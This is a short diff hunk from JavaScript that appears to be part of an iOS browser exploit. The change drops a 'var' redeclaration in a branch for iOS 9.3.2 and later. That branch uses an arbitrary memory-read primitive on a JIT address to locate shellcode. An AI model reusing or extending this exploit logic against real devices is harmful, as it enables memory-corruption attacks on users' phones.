@@ -97,7 +97,7 @@ if (ios_version >= 9) {
 
     // ios 9.3.2+
     if (shellcode < 0xfffffff) {
-        var shellcode_ptr = mem.read32(jit_addr1+0x14);
+        shellcode_ptr = mem.read32(jit_addr1+0x14);
         shellcode = (mem.read32(shellcode_ptr+0x18)&0xfffff000)+0x80000;
     }
 
